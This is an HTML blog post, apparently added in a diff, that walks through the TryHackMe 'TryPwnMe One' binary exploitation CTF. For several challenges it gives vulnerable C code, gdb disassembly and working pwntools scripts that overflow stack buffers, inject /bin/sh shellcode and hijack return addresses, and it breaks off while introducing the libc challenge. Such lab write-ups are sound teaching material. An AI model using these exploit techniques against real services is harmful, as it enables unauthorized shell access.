@@ -1,0 +1,1042 @@
+<!doctype html>
+<html lang=en dir=ltr>
+
+<head>
+    <title>TryPwnMe One | THM Writeup :: W41T3XD3v1L</title>
+    <meta charset=utf-8>
+    <meta name=viewport content="width=device-width,initial-scale=1">
+    <meta name=description
+        content="Introduction Detailed walkthroughs for TryPwnMe One CTF challenges on TryHackMe .
+        TryPwnMe One was a room dedicated to binary exploitation (pwn), featuring seven challenges related to this subject.">
+    <meta name=keywords
+        content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications">
+    <meta name=robots content="noodp">
+    <link rel=manifest href=/manifest.json>
+    <meta property="og:url" content="https://W41T3XD3v1L.github.io/posts/u.a.highschool/writeup/">
+    <meta property="og:site_name" content="W41T3XD3v1L">
+    <meta property="og:title" content="TryPwnMe One | THM Writeup">
+    <meta property="og:description"
+        content="Introduction Detailed walkthroughs for TryPwnMe One CTF challenges on TryHackMe .
+    TryPwnMe One was a room dedicated to binary exploitation (pwn), featuring seven challenges related to this subject.">
+    <meta property="og:locale" content="en">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-08T22:54:06+05:30">
+    <meta property="article:modified_time" content="2024-09-08T22:54:06+05:30">
+    <meta property="og:see_also" content="https://W41T3XD3v1L.github.io/posts/airplane/writeup/">
+    <meta property="og:see_also" content="https://W41T3XD3v1L.github.io/posts/thenewyorkflankees/writeup/">
+    <meta property="og:see_also" content="https://W41T3XD3v1L.github.io/posts/cyberlens/writeup/">
+    <meta name=twitter:card content="summary">
+    <meta name=twitter:title content="TryPwnMe One | THM Writeup">
+    <meta name=twitter:description
+        content="Introduction Detailed walkthroughs for TryPwnMe One CTF challenges on TryHackMe .
+        TryPwnMe One was a room dedicated to binary exploitation (pwn), featuring seven challenges related to this subject.">
+    <link rel=canonical href=https://W41T3XD3v1L.github.io/posts/trypwnme.one/writeup />
+    <link rel="shortcut icon" href=/favicon.ico>
+    <link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
+    <script>var dnt, doNotTrack = !1; if (!1 && (dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack, doNotTrack = dnt == "1" || dnt == "yes"), !doNotTrack) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments) } gtag("js", new Date), gtag("config", "G-376DY6PW0W") }</script>
+    <script
+        type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"W41T3XD3v1L"},"dateModified":"2024-08-25T22:54:06+05:30","datePublished":"2024-08-31T22:54:06+05:30","description":"Introduction Detailed walkthroughs for TryPwnMe One CTF challenges on TryHackMe .\nSummary This CTF challenge required participants to identify and exploit a hidden OS command injection vulnerability in the U.A. Superhero Academy\u0026rsquo;s website. Successful exploitation led to gaining root privileges on the system.\nVulnerability The website contains a hidden functionality that allows for the execution of shell commands. This vulnerability can be exploited to gain unauthorized access to the system.","image":"/posts/U.A.HighSchool/U.A.HighSchool.png","name":"TryPwnMe One | THM Writeup","url":"https://W41T3XD3v1L.github.io/posts/u.a.highschool/writeup/"}</script>
+</head>
+
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
+    <header class="flex flex-none justify-center z-10">
+        <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+            <div class="flex-none ml-2 md:ml-0"><a href= /><img class="h-12 w-12 rounded-full object-cover bg-gray-100"
+                    src=/logo.png alt=logo></a></div>
+            <div class=flex-1></div>
+            <div class=flex-none>
+                <nav class="h-full static"><button id=navbar-menu-toggle type=button
+                        class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden"
+                        aria-controls=navbar-menu aria-expanded=false>
+                        <span class=sr-only>Open main menu</span>
+                        <i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24"
+                                stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                                stroke-linejoin="round">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                <path d="M4 6h16" />
+                                <path d="M4 12h16" />
+                                <path d="M4 18h16" />
+                            </svg></i></button>
+                    <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto"
+                        id=navbar-menu>
+                        <ul
+                            class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+                            <li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/
+                                    title=About>About</a></li>
+                            <li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/
+                                    title=Post>Post</a></li>
+                        </ul>
+                    </div>
+                </nav>
+            </div>
+            <div class="flex-none mx-1"></div>
+            <div class="flex-none md:hidden"><a href=/search/
+                    class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg"
+                    aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
+                    <i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24"
+                            stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                            stroke-linejoin="round">
+                            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                            <path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10" />
+                            <path d="M21 21l-6-6" />
+                        </svg></i></a></div>
+            <div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle
+                    class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600"
+                    title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox
+                        class="sr-only peer" aria-label="Toggle dark mode">
+                    <div
+                        class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+                        <i
+                            class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg
+                                class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24"
+                                stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                                stroke-linejoin="round">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                <path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0" />
+                                <path d="M12 5v.01" />
+                                <path d="M17 7v.01" />
+                                <path d="M19 12v.01" />
+                                <path d="M17 17v.01" />
+                                <path d="M12 19v.01" />
+                                <path d="M7 17v.01" />
+                                <path d="M5 12v.01" />
+                                <path d="M7 7v.01" />
+                            </svg>
+                        </i><i
+                            class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg
+                                class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2"
+                                stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                <path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z" />
+                                <path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2" />
+                                <path d="M19 11h2m-1-1v2" />
+                            </svg></i></div>
+                </label></div>
+        </div>
+    </header>
+    <main class="flex flex-auto justify-center">
+        <div class="w-full max-w-4xl lg:max-w-5xl">
+            <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+                <div><a href=/posts/trypwnme.one/writeup />
+                    <figure><img class="w-full object-cover h-36 md:h-48 xl:h-60"
+                            src=/posts/trypwnme.one/room_image.webp alt="TryPwnMe One | THM Writeup"
+                            title="TryPwnMe One | THM Writeup" loading=lazy></figure></a>
+                </div>
+                <div class="flex flex-col gap-y-3 p-6">
+                    <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a
+                            href=/posts/trypwnme.one/writeup />TryPwnMe One | THM Writeup</a></h1>
+                    <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+                        <li><a href=/categories/ctf/
+                                class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a>
+                        </li>
+                        <li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>Tryhackme</span></a></li>
+                        <li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>Linux</span></a></li>
+                        <li><a href=/levels/easy/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>Medium</span></a></li>
+                    </ul>
+                    <div
+                        class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+                        <div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg
+                                    class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2"
+                                    stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z" />
+                                    <path d="M16 3v4" />
+                                    <path d="M8 3v4" />
+                                    <path d="M4 11h16" />
+                                    <path d="M11 15h1" />
+                                    <path d="M12 15v3" />
+                                </svg>
+                            </i><time datetime=2024-08-25T22:54:06+05:30>2024-09-08</time></div>
+                        <div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg
+                                    class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24"
+                                    stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                                    stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path d="M6.5 7h11" />
+                                    <path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z" />
+                                    <path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z" />
+                                </svg>
+                            </i><span>27 minutes to read</span></div>
+                    </div>
+                    <article
+                        class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+                        <h2 id=introduction>Introduction</h2>
+                        <p>Detailed walkthroughs for <a href=https://tryhackme.com/r/room/trypwnmeone target=_blank
+                                rel=noopener>TryPwnMe One</a>
+                            CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
+                            .</p>
+                        <h3 id=summary>Summary</h3>
+                        <p>TryPwnMe One was a room dedicated to binary exploitation (pwn), featuring seven challenges related to this subject.</p>
+                        <h3 id=tools-used>Tools Used</h3>
+                        <p>python,gdb</p>
+                        <h2 id=enumaration>TryOverflowMe 1</h2>
+                        <p>We begin with <code style="color: red;" >TryOverflowMe 1</code>, using the following reference code as a starting point:</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>int main(){
+    setup();
+    banner();
+    int admin = 0;
+    char buf[0x10];
+
+    puts("PLease go ahead and leave a comment :");
+    gets(buf);
+
+    if (admin){
+        const char* filename = "flag.txt";
+        FILE* file = fopen(filename, "r");
+        char ch;
+        while ((ch = fgetc(file)) != EOF) {
+            putchar(ch);
+    }
+    fclose(file);
+    }
+
+    else{
+        puts("Bye bye\n");
+        exit(1);
+    }
+}</span>
+    </span></span></code></pre>
+                        </div>
+                        <p>We can immediately identify the vulnerability.</p>
+                        <p>It initializes an array with a size of 16 bytes.</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma>char buf[0x10];</pre>
+                        </div>
+                        <p>Then, the <code style="color: red;" >gets</code> function is then called with this array, which reads user input and writes it to the <code style="color: red;" >buf</code> array until it encounters a newline or the end of file (EOF). We can exploit this to write beyond the allocated space for the array on the stack.</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma>gets(buf);</pre>
+                        </div>
+                        <p>To read the flag, our objective is to pass the <code style="color: red;" >if (admin)</code> check. We can achieve this by exploiting the buffer overflow vulnerability to overwrite the value of the <code style="color: red;" >admin</code> variable.</p>
+                        <p>First, we need to determine the locations of the <code style="color: red;" >buf</code> and <code style="color: red;" >admin</code> variables on the stack. We can accomplish this by using <code style="color: red;" >gdb</code> to display the disassembly of the <code style="color: red;" >main</code> function.</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma>$ gdb -batch ./materials-TryPwnMeOne/TryOverFlowMe1/overflowme1 -ex 'disassemble main'
+...
+   0x00000000004008f6 <+28>:    mov    DWORD PTR [rbp-0x4],0x0
+...
+   0x0000000000400909 <+47>:    lea    rax,[rbp-0x30]
+   0x000000000040090d <+51>:    mov    rdi,rax
+   0x0000000000400910 <+54>:    mov    eax,0x0
+   0x0000000000400915 <+59>:    call   0x400680 <gets@plt>
+...</pre>
+                        </div>
+                        <p>We observe that the <code style="color: red;" >buf</code> array is located at <code style="color: red;" >rbp-0x30</code>, while the <code style="color: red;" >admin</code> variable is positioned at <code style="color: red;" >rbp-0x4</code>.</p>
+                        <p>Thus, the <code style="color: red;" >admin</code> variable is situated <code style="color: red;" >44</code> bytes <code style="color: red;" >(0x30 - 0x4)</code> beyond the start of the buf array.</p>
+                        <p>To exploit this, we will write a <code style="color: red;" >Python</code> script utilizing the <code style="color: red;" >pwntools</code> library.</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.log_level = "error"
+
+r = remote("10.10.74.205", 9003)
+
+payload = b"A" * 44     # offset to the admin variable
+payload += p64(1)       # overwrite the admin variable with 1
+
+r.recvuntil(b"Please go ahead and leave a comment :\n")
+r.sendline(payload)
+print(r.recvline().decode())
+r.close()</pre>
+                        </div>
+                        <p>Upon executing it, we obtain the first flag.</p>
+                        <h2>TryOverflowMe 2</h2>
+                        <p>For <code style="color: red;" >TryOverflowMe 2</code>, we are provided with the following reference code:</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma>int read_flag(){
+        const char* filename = "flag.txt";
+        FILE* file = fopen(filename, "r");
+        if(!file){
+            puts("the file flag.txt is not in the current directory, please contact support\n");
+            exit(1);
+        }
+        char ch;
+        while ((ch = fgetc(file)) != EOF) {
+        putchar(ch);
+    }
+    fclose(file);
+}
+
+int main(){
+    
+    setup();
+    banner();
+    int admin = 0;
+    int guess = 1;
+    int check = 0;
+    char buf[64];
+
+    puts("Please Go ahead and leave a comment :");
+    gets(buf);
+
+    if (admin==0x59595959){
+            read_flag();
+    }
+
+    else{
+        puts("Bye bye\n");
+        exit(1);
+    }
+}</pre>
+                        </div>
+                        <p>The vulnerability in this case is the same as that in <code style="color: red;" >TryOverflowMe 1</code>; however, this time we need to overwrite the <code style="color: red;" >admin</code> variable with a specific value <code style="color: red;" >(0x59595959)</code> rather than any non-zero value. Additionally, there are other variables situated between the <code style="color: red;" >buf</code> array and the <code style="color: red;" >admin</code> variable.</p>
+                        <p>As before, we begin by identifying the locations of the variables on the stack.</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma>$ gdb -batch ./materials-TryPwnMeOne/TryOverFlowMe2/overflowme2 -ex 'disassemble main'
+...
+   0x000000000040096c <+28>:    mov    DWORD PTR [rbp-0x4],0x0
+   0x0000000000400973 <+35>:    mov    DWORD PTR [rbp-0x8],0x1
+   0x000000000040097a <+42>:    mov    DWORD PTR [rbp-0xc],0x0
+...
+   0x000000000040098d <+61>:    lea    rax,[rbp-0x50]
+   0x0000000000400991 <+65>:    mov    rdi,rax
+   0x0000000000400994 <+68>:    mov    eax,0x0
+   0x0000000000400999 <+73>:    call   0x400680 <gets@plt>
+...</pre>
+                        </div>
+                        <p>The locations of the variables on the stack are as follows:</p>
+                        <p><ul><li style="color: white;">buf : rbp-0x50</li></ul></p>
+                        <p><ul><li style="color: white;">check : rbp-0xc</li></ul></p>
+                        <p><ul><li style="color: white;">guess : rbp-0x8</li></ul></p>
+                        <p><ul><li style="color: white;">admin : rbp-0x4</li></ul></p>
+                        <p>Thus, the <code style="color: red;" >admin</code> variable is reached after 76 bytes <code style="color: red;" >(0x50 - 0x4)</code>.</p>
+                        <p>We can adapt the exploit from the first challenge by adjusting the offset and the value to be written as follows:</p>
+                        
+                        
+                        <div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.log_level = "error"
+
+r = remote("10.10.74.205", 9004)
+
+payload = b"A" * 76         # offset to the admin variable
+payload += p32(0x59595959)  # overwrite the admin variable with 0x59595959
+
+r.recvuntil(b"Please go ahead and leave a comment :\n")
+r.sendline(payload)
+print(r.recvline().decode())
+r.close()</pre>
+
+<p>Upon running it, we obtain the second flag.</p>
+<h2>TryExecMe</h2>
+<p>For <code style="color: red;" >TryExecMe</code>, the provided reference code is as follows:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>int main(){
+    setup();
+    banner();
+    char *buf[128];   
+
+    puts("\nGive me your shell, and I will execute it: ");
+    read(0,buf,sizeof(buf));
+    puts("\nExecuting Spell...\n");
+
+    ( ( void (*) () ) buf) ();
+
+}    
+</pre></div>
+<p>This time, there is no buffer overflow. The executable reads our input into the buf variable, casts the input as a function, and then calls it, effectively executing our input.</p>
+<p>To solve this challenge, all we need to do is provide a shellcode that spawns a shell.</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+
+r = remote("10.10.74.205", 9005)
+
+payload = asm(shellcraft.sh())      # generates a shellcode that spawns /bin/sh
+
+r.recvuntil(b"Give me your shell, and I will execute it: \n")
+
+r.sendline(payload)
+
+r.recvuntil(b"Executing Spell...\n\n")
+# r.interactive()                   # uncomment for an interactive shell
+r.sendline(b"cat flag.txt")
+print(r.recvline().decode())
+r.close()
+</pre></div>
+<p>With this, we get the third flag.</p>
+<h2>TryRetMe</h2>
+<h3>Solving the Challenge</h3>
+<p>For the <code style="color: red;" >TryRetMe</code> challenge, we are given the below reference code:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>int win(){
+        system("/bin/sh");
+}
+
+void vuln(){
+    char *buf[0x20];
+    puts("Return to where? : ");
+    read(0, buf, 0x200);
+    puts("\nok, let's go!\n");
+}
+
+int main(){
+    setup();
+    vuln();
+}
+</pre></div>
+<p>The vulnerability is similar to those in the previous challenges:</p>
+<p>First, it allocates an array with <code style="color: red;" >256</code> bytes.</p>
+<p>This time, the elements in the array are <code style="color: white;" >char *</code> (char pointers), each of which is 8 bytes, rather than <code style="color: white;" >char</code>, which is 1 byte. Therefore, the buffer size is <code style="color: white;" >0x20 * 8 = 256 (0x100)</code> bytes.</p>
+<p>We can also see this as such in the function disassembly:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>$ gdb -batch ./materials-TryPwnMeOne/TryRetMe/tryretme -ex 'disassemble vuln'
+...
+   0x000000000040120f <+27>:    lea    rax,[rbp-0x100]
+   0x0000000000401216 <+34>:    mov    edx,0x200
+   0x000000000040121b <+39>:    mov    rsi,rax
+   0x000000000040121e <+42>:    mov    edi,0x0
+   0x0000000000401223 <+47>:    call   0x401090 <read@plt>
+</pre></div>
+<p>After that, it reads 512 bytes <code style="color: red;" >(0x200)</code> into the buffer, which exceeds the allocated buffer size.</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>read(0, buf, 0x200);
+</pre></div>
+<p>This time, there are no variables to overwrite; instead, we have the <code style="color:red;">win</code> function, which spawns a shell. To exploit this, we will manipulate the <code style="color:red;">return address</code>, which is located on the stack immediately after the <code style="color:red;">RBP</code>. The <code style="color:red;">return address</code> is a pointer that indicates where the program should resume execution after a function call. By overwriting this address with the address of the <code style="color:red;">win</code> function, we ensure that, upon completion of the <code style="color:red;">vuln</code> function, the program will continue execution from the <code style="color:red;">win</code> function.</p>
+<p>We can accomplish this as follows:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF(
+    "./materials-TryPwnMeOne/TryRetMe/tryretme", checksec=False
+)
+
+r = remote("10.10.74.205", 9006)
+
+rop = ROP(binary)
+ret = rop.find_gadget(["ret"])[0]
+win_function_address = binary.symbols["win"]
+
+payload = b"A" * 256                        # offset to the RBP
+payload += b"B" * 8                         # overwrite the RBP
+payload += p64(ret)                         # overwrite the return address with the ret instruction for stack allignment
+payload += p64(win_function_address)        # address of the win function
+
+r.recvuntil(b"Return to where? : \n")
+r.sendline(payload)
+r.recvuntil(b"ok, let's go!\n\n")
+# r.interactive()                           # uncomment for an interactive shell
+r.sendline(b"cat flag.txt")
+print(r.recvline().decode())
+r.close()
+</pre></div>
+<h2>Stack Allignment</h2>
+<p>Examining the code, you may wonder why we include a <code style="color:red;">ret</code> instruction before jumping to the <code style="color:red;">win</code> function. This is necessary for stack alignment.</p>
+<p>You can read more about stack alignment <a  style="color: palevioletred;" href="https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment">here</a>.</p>
+<p>To understand the need for the <code style="color:red;">ret</code> instruction for proper stack alignment, you can run the following code, which does not include it:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF(
+    "./materials-TryPwnMeOne/TryRetMe/tryretme", checksec=False
+)
+
+r = process()
+gdb.attach(r)
+
+win_function_address = binary.symbols["win"]
+
+payload = b"A" * 256                    # offset to the RBP
+payload += b"B" * 8                     # overwrite the RBP
+payload += p64(win_function_address)    # address of the win function
+
+r.recvuntil(b"Return to where? : \n")
+r.sendline(payload)
+r.recvuntil(b"ok, let's go!\n\n")
+r.interactive()
+</pre></div>
+<p>As observed, the program crashes when attempting to spawn a shell upon reaching the <code style="color:red;">movaps</code> instruction, which utilizes 16-byte <code style="color:red;">xmm</code> registers while the stack is not 16-byte aligned (<code style="color:red;">0x7ffc7e10b478 % 16 = 8</code>).</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img src="../01.webp" alt="highlight" style="display: block;">
+</div>
+<h2>Random Memories</h2>
+<p>For <code style="color: red;" >Random Memories</code>, the provided code is as follows:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>int win(){
+    system("/bin/sh\0");
+}
+
+void vuln(){
+    char *buf[0x20];
+    printf("I can give you a secret %llx\n", &vuln);
+    puts("Where are we going? : ");
+    read(0, buf, 0x200);
+    puts("\nok, let's go!\n");
+}
+
+int main(){
+    setup();
+    banner();
+    vuln();
+}
+</pre></div>
+<p>So, what makes this one different from the previous challenge? We can identify this by checking the protections enabled for the binaries using <code style="color: red;" >checksec</code>.</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>$ checksec ./materials-TryPwnMeOne/TryRetMe/tryretme
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+$ checksec ./materials-TryPwnMeOne/RandomMemories/random
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</pre></div>
+<p>As we can see, previously <code style="color:red;">PIE</code> (Position-Independent Executable) was not enabled. This means that when the binary runs, it is loaded at the same memory address each time (<code style="color:red;">0x400000</code>).</p>
+<p>However, with <code style="color:red;">PIE</code> enabled and <code style="color:red;">ASLR</code> (Address Space Layout Randomization) in effect, the binary is loaded at a random memory address each time it runs. This makes it difficult to predict where the <code style="color:red;">win</code> function will be located, preventing us from directly overwriting the return address with it.</p>
+<p>So, how can we address this issue? Fortunately, right before reading our input, the binary prints the address of the <code style="color:red;">vuln</code> function.</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>printf("I can give you a secret %llx\n", &vuln);</pre></div>
+<p>The binary will be loaded into a different, random memory address each time it runs, but it is still the same binary. This means that if we know the address of the <code style="color: red;" >vuln</code> function and its offset in the binary (which we can easily determine since we have the binary), we can calculate the base address where the binary is loaded. With this information, we can also determine the addresses of any other functions in the binary and exploit it in the same way as before.</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>#!/usr/bin/env python3
+from pwn import *
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/RandomMemories/random", checksec=False)
+r = remote("10.10.74.205", 9007)
+
+r.recvuntil(b"I can give you a secret ")
+vuln_address = int(r.recvline().rstrip().decode(), 16)  # parse the printed address of the vuln function
+print(f"[+] Got the vuln function address: {hex(vuln_address)}")
+
+binary_base_address = vuln_address - binary.symbols["vuln"] # calculate the base address the binary is loaded
+print(f"[+] Calculated the binary base address: {hex(binary_base_address)}")
+
+binary.address = binary_base_address    # set the binary base address to match the process's memory layout
+
+win_address = binary.symbols["win"]
+print(f"[+] Calculated the win function address: {hex(win_address)}")
+
+rop = ROP(binary)
+ret = rop.find_gadget(["ret"])[0]
+
+payload = b"A" * 256                # offset to the RBP
+payload += b"B" * 8                 # overwrite the RBP
+payload += p64(ret)                 # ret instruction for stack alignment
+payload += p64(win_address)         # calculated address of the win function 
+
+r.recvuntil(b"Where are we going? : \n")
+r.sendline(payload)
+r.recvuntil(b"ok, let's go!\n\n")
+# r.interactive()                   # uncomment for an interactive shell
+r.sendline(b"cat flag.txt")
+print(r.recvline().decode())
+r.close()</pre></div>
+<h2>The Librarian</h2>
+<p>For <code style="color: red;" >The Librarian</code>, we are provided with the reference code:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>void vuln(){
+    char *buf[0x20];
+    puts("Again? Where this time? : ");
+    read(0, buf, 0x200);
+    puts("\nok, let's go!\n");
+    }
+
+int main(){
+    setup();
+    vuln();
+
+}
+</pre></div>
+
+<p>This time, we have yet another buffer overflow vulnerability, but there is no function to jump to or variable to overwrite.</p>
+<p>Checking the binary with <code style="color: red;" >checksec</code>, we see that <code style="color: red;" >PIE</code> is not enabled. This means we can overwrite the return address to jump to any part of the binary. However, there is nothing in the binary that directly helps us obtain the flag.</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>$ checksec ./materials-TryPwnMeOne/TheLibrarian/thelibrarian
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fe000)
+    RUNPATH:  b'.'
+</pre></div>
+<p>So, what can we do? Even though there is nothing useful directly in the binary, it is linked with the <code style="color:red;">libc</code> library, which provides functions like <code style="color:red;">puts</code> and <code style="color:red;">read</code>. The <code style="color:red;">libc</code> library also includes useful functions like <code style="color:red;">system</code>, which we can use to spawn a shell.</p>
+<p>If we can overwrite the return address with the address of the <code style="color:red;">system</code> function and provide the correct parameters for this function call, we can spawn a shell. However, we face the same issue as before: with <code style="color:red;">PIE</code> enabled for <code style="color:red;">libc</code> and ASLR in effect, we cannot predict the exact address where <code style="color:red;">libc</code> will be located.</p>
+<div class=highlight></div>
+<pre tabindex=0 class=chroma>$ checksec ./materials-TryPwnMeOne/TheLibrarian/libc.so.6
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</pre></div>
+<p>At this stage, we can attempt to leak an address from the <code style="color:red;">libc</code> library to determine its location in memory. But to achieve this, we need to know a bit about the <code style="color:red;">PLT</code> (Procedure Linkage Table) and <code style="color:red;">GOT</code> (Global Offset Table).</p>
+
